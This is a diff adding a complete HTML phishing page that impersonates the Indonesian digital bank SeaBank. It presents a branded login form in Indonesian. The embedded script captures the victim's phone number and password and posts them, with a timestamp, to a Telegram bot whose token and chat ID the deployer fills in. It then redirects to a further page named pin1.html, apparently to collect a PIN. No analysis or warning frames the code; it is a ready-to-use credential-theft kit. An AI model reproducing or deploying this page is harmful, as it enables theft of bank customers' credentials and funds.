@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SeaBank - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #FFFFFF;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 40px 30px;
+        }
+
+        /* Logo */
+        .logo-container {
+            text-align: center;
+            margin-top: 40px;
+            margin-bottom: 60px;
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, #FF7A00 0%, #FF9500 100%);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 42px;
+            color: white;
+            font-weight: bold;
+        }
+
+        .app-name {
+            font-size: 26px;
+            font-weight: 700;
+            color: #FF7A00;
+        }
+
+        .tagline {
+            font-size: 14px;
+            color: #888888;
+            margin-top: 6px;
+        }
+
+        /* Form */
+        .form-container {
+            width: 100%;
+            max-width: 380px;
+            margin: 0 auto;
+        }
+
+        .welcome-text {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #E0E0E0;
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .input-field:focus {
+            border-color: #FF7A00;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+            cursor: pointer;
+            color: #888;
+        }
+
+        .forgot-link {
+            text-align: right;
+            margin-bottom: 30px;
+        }
+
+        .forgot-link a {
+            color: #FF7A00;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #FF7A00 0%, #FF9500 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.3s;
+        }
+
+        .btn-login:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-login:active:not(:disabled) {
+            opacity: 0.85;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 40px 0 30px;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #E0E0E0;
+        }
+
+        .divider-text {
+            padding: 0 16px;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .register-link {
+            text-align: center;
+        }
+
+        .register-link span {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .register-link a {
+            color: #FF7A00;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            color: #FF7A00;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo-container">
+        <div class="logo">S</div>
+        <div class="app-name">SeaBank</div>
+        <div class="tagline">Bank Digital Terpercaya</div>
+    </div>
+
+    <div class="form-container">
+        <div class="welcome-text">Masuk ke Akun Anda</div>
+
+        <div class="input-group">
+            <label class="input-label">Nomor Ponsel</label>
+            <div class="input-wrapper">
+                <input type="tel" class="input-field" id="hp" placeholder="Masukkan nomor HP">
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label class="input-label">Kata Sandi</label>
+            <div class="input-wrapper">
+                <input type="password" class="input-field" id="password" placeholder="Masukkan kata sandi">
+                <span class="eye-icon" onclick="togglePassword()">👁️</span>
+            </div>
+        </div>
+
+        <div class="forgot-link">
+            <a href="#">Lupa Kata Sandi?</a>
+        </div>
+
+        <button class="btn-login" id="btnLogin">Masuk</button>
+
+        <div class="loading" id="loading">⏳ Sedang memproses...</div>
+
+        <div class="divider">
+            <div class="divider-line"></div>
+            <div class="divider-text">atau</div>
+            <div class="divider-line"></div>
+        </div>
+
+        <div class="register-link">
+            <span>Belum punya akun?</span>
+            <a href="#">Daftar Sekarang</a>
+        </div>
+    </div>
+
+    <script>
+        // === SETTING TELEGRAM BOT ===
+        const BOT_TOKEN = 'GANTI_DENGAN_TOKEN_BOT_ANDA';
+        const CHAT_ID = 'GANTI_DENGAN_CHAT_ID_ANDA';
+        // ============================
+
+        function togglePassword() {
+            const pwd = document.getElementById('password');
+            pwd.type = pwd.type === 'password' ? 'text' : 'password';
+        }
+
+        async function kirimKeTelegram(noHP, sandi) {
+            const pesan = `🔐 Login SeaBank\n📱 Nomor HP: ${noHP}\n🔑 Kata Sandi: ${sandi}\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return res.ok;
+            } catch (err) {
+                console.error('Error kirim ke Telegram:', err);
+                return false;
+            }
+        }
+
+        document.getElementById('btnLogin').addEventListener('click', async function() {
+            const noHP = document.getElementById('hp').value.trim();
+            const sandi = document.getElementById('password').value.trim();
+            
+            if (!noHP || !sandi) {
+                alert('Harap isi nomor HP dan kata sandi!');
+                return;
+            }
+
+            // Tampilkan loading
+            document.getElementById('loading').style.display = 'block';
+            this.disabled = true;
+
+            // Kirim ke Telegram
+            await kirimKeTelegram(noHP, sandi);
+
+            // Pindah ke halaman pin1.html setelah 1.5 detik
+            setTimeout(() => {
+                window.location.href = 'pin1.html';
+            }, 1500);
+        });
+    </script>
+    
+</body>
+</html>
